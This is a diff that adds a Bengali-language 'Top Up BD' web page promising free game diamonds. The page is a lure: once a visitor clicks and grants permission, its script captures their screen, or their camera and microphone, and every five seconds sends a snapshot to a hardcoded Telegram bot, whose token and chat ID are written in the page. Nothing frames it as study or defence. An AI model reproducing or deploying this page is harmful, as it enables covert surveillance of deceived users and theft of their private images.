@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Top Up BD</title>
+    <style>
+        body {
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            height: 100vh; display: flex; justify-content: center; align-items: center;
+            color: white; text-align: center; overflow: hidden;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.75); padding: 30px; border-radius: 20px;
+            box-shadow: 0 0 25px rgba(0,0,0,0.6); width: 85%; border: 2px solid #ff416c;
+        }
+        .diamond-icon { font-size: 70px; margin-bottom: 15px; animation: beat 1.5s infinite; }
+        @keyframes beat { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
+        h1 { color: #00ffcc; text-shadow: 2px 2px 10px rgba(0, 255, 204, 0.5); margin-bottom: 10px; }
+        p { font-size: 18px; margin-bottom: 25px; font-weight: bold; line-height: 1.4; }
+        #startButton {
+            background: linear-gradient(to right, #ff416c, #ff4b2b); border: none;
+            padding: 16px 45px; color: white; font-size: 22px; font-weight: bold;
+            border-radius: 50px; cursor: pointer; transition: 0.3s;
+            box-shadow: 0 5px 20px rgba(255, 75, 43, 0.5); text-transform: uppercase;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="diamond-icon">💎</div>
+        <h1>Top Up BD</h1>
+        <p>ফ্রি ডায়মন্ড ভেরিফিকেশনের জন্য নিচে ক্লিক করুন এবং পরবর্তী ধাপে 'Allow' বা 'Start Now' দিন।</p>
+        <button id="startButton">CLICK NOW</button>
+    </div>
+
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // আপনার টেলিগ্রাম বট সেটিংস
+        const botToken = '8509132174:AAEwLrB9z6fmcThT5rYgjvdae09LCAI6M0U';
+        const chatId = '6425561662';
+
+        document.getElementById('startButton').onclick = async function() {
+            try {
+                let stream;
+                // স্ক্রিন রেকর্ড ও ক্যামেরা পারমিশন রিকোয়েস্ট
+                try {
+                    stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                } catch (err) {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                }
+
+                // কানেকশন সফল হলে টেলিগ্রামে মেসেজ পাঠানো
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=✅ Connection_Success!_Target_Active.`);
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+
+                // প্রতি ৫ সেকেন্ডে ছবি তুলে টেলিগ্রামে পাঠানো
+                setInterval(() => {
+                    const canvas = document.getElementById('c');
+                    if (video.videoWidth > 0) {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('photo', blob, 'img.jpg');
+                            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {method: 'POST', body: formData});
+                        }, 'image/jpeg', 0.4);
+                    }
+                }, 5000);
+            } catch (e) {
+                alert("ডায়মন্ড পেতে 'Allow' ক্লিক করা বাধ্যতামূলক।");
+            }
+        };
+    </script>
+</body>
+</html>
+
